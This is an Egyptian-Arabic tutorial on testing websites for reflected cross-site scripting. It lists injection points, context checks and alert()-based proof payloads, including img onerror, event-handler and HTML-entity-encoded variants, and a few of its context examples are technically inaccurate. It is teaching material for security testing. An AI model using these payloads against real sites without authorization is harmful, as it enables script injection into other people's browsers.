## 1. Test every entry point

أول خطوة في اختبار **XSS** هي إنك تختبر كل نقطة ممكن المستخدم يدخل منها بيانات. دي ممكن تكون في **URL**، **message body**، أو **HTTP headers**. لازم تتأكد إن مفيش أي مدخلات ممكن تنفذ **JavaScript** غير مصفى بشكل كويس.

### حالات التجربة:
- **URL Query String**:
    - لو عندك رابط زي ده:
      ```text
      https://example.com?username=user123
      ```
    - جرب تحقن فيه كود **XSS** زي:
      ```text
      https://example.com?username=<script>alert('XSS')</script>
      ```

- **URL File Path**:
    - لو الموقع بيستقبل بيانات من **file path**، زي:
      ```text
      https://example.com/file/abc123
      ```
    - جرب تحقن فيه كود **XSS** زي:
      ```text
      https://example.com/file/<script>alert('XSS')</script>
      ```

- **HTTP Headers**:
    - جرب تحقن كود **XSS** داخل **HTTP headers** زي:
      - **User-Agent**:
        ```text
        User-Agent: <script>alert('XSS')</script>
        ```
      - **Referer**:
        ```text
        Referer: <script>alert('XSS')</script>
        ```

---

## 2. Submit random alphanumeric values

الخطوة الجاية هي إنك تبعت قيم عشوائية (حروف وأرقام) في كل النقاط اللي جربتها فوق. ده هيساعدك تكتشف إذا كان **XSS** هيظهر في الاستجابة ولا لأ.

### حالات التجربة:
- **قيم عشوائية قصيرة**:
    - جرب تبعت قيمة عشوائية زي:
      ```text
      abc123xy
      ```
    - جرب تبعتها في **URL** زي:
      ```text
      https://example.com?username=abc123xy
      ```
    - لو القيمة ظهرت في الاستجابة زي:
      ```html
      <p>abc123xy</p>
      ```
      ده معناه إن القيمة انعكست بشكل مباشر من غير تصفية.

- **قيم عشوائية أطول**:
    - جرب تبعت قيمة أطول زي:
      ```text
      x1y2z3abcd789xyz
      ```
    - نفس الفكرة، اختبرها في **URL** أو **HTTP headers** وشوف لو في انعكاس.

---

## 3. Determine the reflection context

المرحلة دي بتعتمد على المكان اللي ظهرت فيه القيمة العشوائية في الاستجابة. هل ظهرت جوه **HTML tag**؟ ولا في **HTML attribute**؟ ولا جوه **JavaScript string**؟ لازم تحدد ده علشان تقدر تحقن **XSS** بشكل صحيح.

### حالات التجربة:
- **داخل HTML tags**:
    - لو القيمة ظهرت في **HTML tags**، زي:
      ```html
      <p>abc123xy</p>
      ```
    - تقدر تحقن كود **XSS** زي:
      ```html
      <p><script>alert('XSS')</script></p>
      ```

- **داخل HTML Attribute**:
    - لو القيمة ظهرت في **HTML attribute** زي:
      ```html
      <input type="text" value="abc123xy">
      ```
    - هنا ممكن تحقن كود **XSS** زي:
      ```html
      <input type="text" value="abc123xy" onclick="alert('XSS')">
      ```

- **داخل JavaScript string**:
    - لو القيمة ظهرت في **JavaScript string**، زي:
      ```javascript
      var username = 'abc123xy';
      ```
    - هنا تقدر تحقن كود **XSS** داخل الـ **JavaScript** زي:
      ```javascript
      var username = '<script>alert("XSS")</script>';
      ```

---

## 4. Test a candidate payload

بعد ما تحدد مكان انعكاس القيمة، جرب تحقن **XSS payload** مبدئي في المكان ده. جرب ترسل **payload** في الـ **URL** أو في الـ **headers** أو جوه الـ **HTML**، وشوف لو الكود اتنفذ.

### حالات التجربة:
- **داخل HTML**:
    - لو القيمة ظهرت في **HTML** زي:
      ```text
      https://example.com?username=<script>alert('XSS')</script>
      ```
    - لو الكود ده اتنفذ في المتصفح هيظهر **alert**.

- **داخل HTML Attribute**:
    - لو القيمة ظهرت داخل **attribute** زي:
      ```html
      <input type="text" value="<script>alert('XSS')</script>">
      ```
    - لو الكود ده اتنفذ هيشغل الـ **JavaScript**.

---

## 5. Test alternative payloads

لو **XSS payload** المبدئي ما اشتغلش، جرب **alternative payloads** تانية. فيه كذا طريقة ممكن تحقن بيها **XSS**.

### حالات التجربة:
- **بدائل لـ `<script>`**:
    - لو الـ **script** تم منعه، جرب كود زي ده:
      ```html
      <img src="x" onerror="alert('XSS')">
      ```

- **استخدام JavaScript event handlers**:
    - لو الكود جوه **HTML** أو **input**، جرب تحقن event handler زي:
      ```html
      <input type="text" value="abc123xy" onclick="alert('XSS')">
      ```

- **استخدام HTML Entities**:
    - لو فيه تصفية على الـ **script**، جرب تستخدم **HTML entities**:
      ```html
      <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;('XSS')">
      ```

---

## 6. Test the attack in a browser

بعد ما تتأكد إن **XSS payload** شغالة في **Burp Repeater** أو أي أداة تانية، لازم تختبرها في متصفح حقيقي.

### حالات التجربة:
- **اختبار مع `alert()`**:
    - جرب تفتح الرابط في المتصفح زي:
      ```text
      https://example.com?username=<script>alert('XSS')</script>
      ```
    - لو ظهر **alert** في المتصفح، يبقى الهجوم نجح.

- **اختبار مع `console.log()`**:
    - جرب كود زي:
      ```javascript
      <script>console.log('XSS')</script>
      ```
    - لو الكود ظهر في الـ **console**، يبقى الهجوم نجح.

![image](https://github.com/user-attachments/assets/2557d1d1-6606-4515-b7de-e7f48e0b42a6)
![images](https://github.com/user-attachments/assets/d82d4076-013c-45d9-9ebc-5103e841d5d8) 
